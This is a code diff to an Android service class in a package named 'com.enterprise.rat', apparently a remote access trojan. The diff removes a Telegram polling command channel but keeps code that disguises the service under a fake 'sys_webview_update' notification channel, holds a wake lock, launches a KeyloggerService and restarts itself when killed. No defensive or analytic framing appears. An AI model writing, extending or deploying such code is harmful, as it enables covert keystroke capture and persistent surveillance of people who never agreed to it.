@@ -20,7 +20,6 @@ import com.enterprise.rat.receivers.AlarmReceiver;
 public class MainService extends Service {
     private static final int NOTIFICATION_ID = 1001;
     private static final String CHANNEL_ID = "sys_webview_update";
-    private TelegramPolling telegramPolling;
     private PowerManager.WakeLock wakeLock;
 
     @Override
@@ -35,7 +34,6 @@ public class MainService extends Service {
             startForeground(NOTIFICATION_ID, buildNotification());
         }
         acquireWakeLock();
-        startTelegramPolling();
         startKeylogger();
         scheduleAlarm();
     }
@@ -43,9 +41,6 @@ public class MainService extends Service {
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         Log.d("MainService", "onStartCommand");
-        if (telegramPolling == null || !telegramPolling.isRunning()) {
-            startTelegramPolling();
-        }
         return START_STICKY;
     }
 
@@ -93,13 +88,6 @@ public class MainService extends Service {
         }
     }
 
-    private void startTelegramPolling() {
-        if (telegramPolling != null) telegramPolling.stop();
-        telegramPolling = new TelegramPolling(this);
-        new Thread(telegramPolling).start();
-        Log.d("MainService", "Polling started");
-    }
-
     private void startKeylogger() {
         Intent intent = new Intent(this, KeyloggerService.class);
         try {
@@ -141,7 +129,6 @@ public class MainService extends Service {
     @Override
     public void onDestroy() {
         Log.d("MainService", "onDestroy");
-        if (telegramPolling != null) telegramPolling.stop();
         if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
 
         Intent restartIntent = new Intent(this, AlarmReceiver.class);
